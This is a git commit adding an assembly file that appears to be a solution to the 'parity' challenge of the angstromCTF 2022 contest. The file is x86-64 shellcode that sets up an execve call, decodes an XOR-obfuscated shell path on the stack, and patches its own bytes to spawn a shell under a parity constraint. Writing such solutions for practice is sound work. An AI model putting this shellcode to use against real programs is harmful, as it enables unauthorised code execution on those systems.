60375aeaa024efbb92082504b13c7d21dfb23de0
Itz_me_strikerr <ajaysuresh306@gmail.com>
2022-05-19 23:28:06 +0530

    angstorm22

---
+++ angstorm22/parity/custom1.s
@@ -0,0 +1,97 @@
+BITS 64
+
+xchg r15,rsi
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax
+inc eax 
+inc eax
+mov r8b,1
+xor rsi,rsi
+mov r8b,1
+xor rdx,rdx
+mov r8b,1
+mov rbx,0x0168732e6d68612e
+nop
+push rbx
+mov rsi,rsp
+xor dword [rsi],0x1
+inc rsi
+xor dword [rsi],0x3
+inc rsi
+xor dword [rsi],0x1
+inc rsi
+xor dword [rsi],0x3
+inc rsi
+xor dword [rsi],0x1
+inc rsi
+mov r8b,1
+inc rsi
+mov r8b,1
+inc rsi
+xor dword [rsi],0x1
+xchg rdi,rsp
+mov r8b,1
+xor rsi,rsi
+xor  r15b,0xe4
+add byte [r15],0xe
+inc byte [r15]
+nop
+inc r15b
+nop
+add byte [r15],0x4
+inc byte [r15]
